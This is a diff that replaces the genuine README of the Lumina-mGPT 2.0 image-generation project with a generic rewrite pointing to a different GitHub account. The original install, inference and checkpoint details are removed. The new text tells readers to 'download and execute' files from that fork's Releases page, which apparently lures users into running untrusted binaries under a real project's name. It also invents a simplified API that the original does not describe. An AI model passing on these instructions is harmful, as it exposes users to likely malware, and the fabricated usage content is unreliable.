@@ -1,124 +1,103 @@
-<p align="center">
- <img src="./assets/lumina-mgpt-2.0.png" width="15%"/>
- <br>
-</p>
+```markdown
+# 🌟 Lumina-mGPT 2.0: Stand-alone Autoregressive Image Modeling 🌟
 
-<div align="center">
-<h1> Lumina-mGPT 2.0: Stand-alone Autoregressive Image Modeling </h1>
+![Lumina-mGPT 2.0](https://img.shields.io/badge/Lumina--mGPT%202.0-v1.0.0-blue.svg)
 
-<b>¹Shanghai AI Laboratory, &nbsp;  ²SII, &nbsp; ³CUHK, &nbsp;⁴ZJUT</b>
+Welcome to the Lumina-mGPT 2.0 repository! This project focuses on autoregressive image modeling. Our aim is to provide an efficient, flexible, and user-friendly framework for generating images based on given prompts. 
 
-</div>
+## Table of Contents
 
-## 📚 Introduction 
-We introduce a stand-alone, decoder-only autoregressive model, **trained from scratch**, that unifies a broad spectrum of image generation tasks, including **text-to-image generation, image pair generation, subject-driven generation, multi-turn image editing, controllable generation, and dense prediction**.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-<details open>
-  <summary>User Demo</summary>
-  <video src="https://github.com/user-attachments/assets/7b87eeac-3f20-450c-8df0-a45218acc51d" width="100%"/></video>
-</details>
-   
-<details open>
-  <summary>Architecture</summary>
-  <img src="./assets/architecture.png" width="100%"/>
-</details>
+## Features
 
+- **Autoregressive Modeling**: Generate high-quality images by predicting each pixel based on previous pixels.
+- **Stand-alone Framework**: Easy to set up and run without dependencies on large-scale infrastructures.
+- **User-friendly API**: Simplifies the process of creating and managing image models.
+- **Flexible Configurations**: Adjust parameters to suit your specific needs for various image generation tasks.
 
+## Installation
 
-## 🔥 News
-**[2025-04-03]** 🎉🎉🎉 Lumina-mGPT 2.0 is released! 🎉🎉🎉
+To get started with Lumina-mGPT 2.0, follow these steps:
 
+1. Clone the repository:
+    ```bash
+    git clone https://github.com/Basha206/Lumina-mGPT-2.0.git
+    cd Lumina-mGPT-2.0
+    ```
 
-## 📝 Open-source Plan
- - [x] Text-to-Image / Image Pair Generation Inference & Checkpoints
- - [x] Finetuning code
- - [ ] All-in-One Inference & Checkpoints
- - [ ] Technical Report
+2. Install the required packages:
+    ```bash
+    pip install -r requirements.txt
+    ```
 
-## 📽️ Demo Examples
-<details open>
-  <summary>Qualitative Performance</summary>
- <img src="./assets/qualitative.jpg" width="100%"/>
-</details>
+3. Download and execute the model files from the [Releases](https://github.com/Basha206/Lumina-mGPT-2.0/releases) section.
 
-<details open>
-  <summary>Comparison with Lumina-mGPT and Janus Pro</summary>
-  <img src="./assets/comparison.png" width="100%"/>
-</details>
+## Usage
 
+After installing Lumina-mGPT 2.0, you can start using the model as follows:
 
-## 🚀 Quick Start
-### ⚙️ Installation
-#### 1. Create a conda environment
-```
-git clone https://github.com/Alpha-VLLM/Lumina-mGPT-2.0.git && cd Lumina-mGPT-2.0
-conda create -n lumina_mgpt_2 python=3.10 -y
-conda activate lumina_mgpt_2
-```
-#### 2. Install  dependencies
-```
-pip install -r requirements.txt
-pip install https://github.com/Dao-AILab/flash-attention/releases/download/v2.7.4.post1/flash_attn-2.7.4.post1+cu12torch2.3cxx11abiFALSE-cp310-cp310-linux_x86_64.whl --no-build-isolation
-pip install -e .
-```
-> Kindly find proper flash-attn version from this [link](https://github.com/Dao-AILab/flash-attention/releases).
-#### 3. Download MoVQGAN
-Download MoVQGAN weights and put them to the ```lumina_mgpt/movqgan/270M/movqgan_270M.ckpt```.
-```
-mkdir -p lumina_mgpt/movqgan/270M
-wget -O lumina_mgpt/movqgan/270M/movqgan_270M.ckpt https://huggingface.co/ai-forever/MoVQGAN/resolve/main/movqgan_270M.ckpt
-```
+1. **Import the Library**:
+    ```python
+    from lumina_mgpt import Model
+    ```
 
-### ⛽ Inference
-#### 1. Simple Inference
-```
-python generate_examples/generate.py \
---model_path Alpha-VLLM/Lumina-mGPT-2.0 --save_path save_samples/ \
---cfg 4.0 --top_k 4096 --temperature 1.0 --width 768 --height 768
+2. **Initialize the Model**:
+    ```python
+    model = Model()
+    ```
+
+3. **Generate an Image**:
+    ```python
+    image = model.generate(prompt="A futuristic cityscape")
+    ```
+
+4. **Save the Image**:
+    ```python
+    image.save("output.png")
+    ```
+
+### Example Code
+
+Here is an example of how to generate multiple images:
+
+```python
+prompts = ["A serene landscape", "A busy market", "An abstract design"]
+for prompt in prompts:
+    img = model.generate(prompt=prompt)
+    img.save(f"{prompt}.png")
 ```
 
-#### 2. Accelerate Inference
-Provide two acceleration strategies: Speculative Jacobi Decoding (```--speculative_jacobi```) and Model Quantization (```--quant```).
+## Contributing
+
+We welcome contributions from the community! To contribute, please follow these guidelines:
+
+1. Fork the repository.
+2. Create a new branch: `git checkout -b feature/YourFeature`
+3. Make your changes and commit them: `git commit -m 'Add new feature'`
+4. Push to the branch: `git push origin feature/YourFeature`
+5. Create a new Pull Request.
+
+### Code of Conduct
+
+Please adhere to our Code of Conduct while contributing to this project. Be respectful and considerate in your communications.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+## Support
+
+If you encounter any issues or have questions, please open an issue in the repository. 
+
+For updates and releases, visit the [Releases](https://github.com/Basha206/Lumina-mGPT-2.0/releases) section.
+
+---
+
+Thank you for your interest in Lumina-mGPT 2.0! We hope you find this tool helpful for your image generation projects. Happy modeling! 🎨✨
 ```
-python generate_examples/generate.py \
---model_path Alpha-VLLM/Lumina-mGPT-2.0 --save_path save_samples/ \
---cfg 4.0 --top_k 4096 --temperature 1.0 --width 768 --height 768 \
---speculative_jacobi --quant
-```
-
-We provide the inference time and GPU memory on one A100 as a reference:
-| Method               | Inference Time | Inference GPU Memory | Description |
-|----------------------|--------|--------|--------------------|
-| Lumina-mGPT 2.0      | 694s   | 80 GB  | ✅ Recommend |
-| + speculative_jacobi | 324s     | 79.2 GB  | ✅ Recommend |
-| + speculative_jacobi & quant | 304s     | 33.8 GB  |  |
-
-### 💻 Finetuning
-Please refer to  [TRAIN.md](TRAIN.md)
-
-
-## 🤗 Checkpoints
-| Model                | Size | Reso | pth link | Description |
-|----------------------|--------|--------|--------------------|--------------------|
-| Lumina-mGPT 2.0      | 7B     | 768px  | [7B_768px](https://huggingface.co/Alpha-VLLM/Lumina-mGPT-2.0)       | Text-to-Image & Image Pair Generation |
-
-## 🌟 Acknowledgements
-
-**Thanks to the following open-sourced codebase for their wonderful work and codebase!**
-- [Lumina-mGPT: Illuminate Flexible Photorealistic Text-to-Image Generation with Multimodal Generative Pretraining](https://github.com/Alpha-VLLM/Lumina-mGPT)
-- [Accelerating Auto-regressive Text-to-Image Generation with Training-free Speculative Jacobi Decoding](https://github.com/tyshiwo1/Accelerating-T2I-AR-with-SJD/)
-- [Chameleon: Mixed-Modal Early-Fusion Foundation Models](https://github.com/facebookresearch/chameleon)
-
-## 📖 BibTeX
-
-```
-@misc{lumina-mgpt-2.0,
-      title={Lumina-mGPT 2.0: Stand-alone Autoregressive Image Modeling},
-      author={AlphaVLLM Team},
-      year={2025},
-      url={https://github.com/Alpha-VLLM/Lumina-mGPT-2.0},
-}
-```
-
-
-
